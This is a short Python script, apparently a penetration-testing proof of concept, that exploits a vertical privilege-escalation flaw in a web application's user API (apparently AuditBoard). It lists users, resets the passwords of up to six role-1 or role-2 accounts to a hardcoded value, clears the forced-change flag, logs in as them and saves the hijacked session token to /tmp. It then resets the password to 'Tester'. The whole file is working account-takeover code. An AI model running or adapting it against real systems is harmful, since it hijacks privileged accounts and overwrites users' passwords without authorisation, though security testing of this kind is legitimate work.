import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!vert47"
def req(method,path,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
c,b=req('GET','/api/v1/users')
us=json.loads(b)['users']
cands=[u for u in us if u.get('auth_type')=='password' and u.get('role_id') in (1,2)]
print(f"login-enabled role1/role2 targets: {len(cands)}\n")
for u in cands[:6]:
    uid=u['id']
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":PW}})
    res=f"PUT={c}"
    if c=='200':
        req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
        c2,b2=login(u['email'],PW)
        res+=f" login={c2}"
        if c2=='200':
            s=json.loads(b2)['session']
            res+=f"  *** VERTICAL ESCALATION -> role {s['role_id']} ***"
            open('/tmp/vert_tok','w').write(s['token'])
            print(f"  {uid:3} role{u['role_id']} {u['email'][:38]:40} {res}")
            print("  restoring...")
            req('PUT',f'/api/v1/users/{uid}',{"user":{"password":"Tester"}})
            req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
            break
    print(f"  {uid:3} role{u['role_id']} {u['email'][:38]:40} {res}")
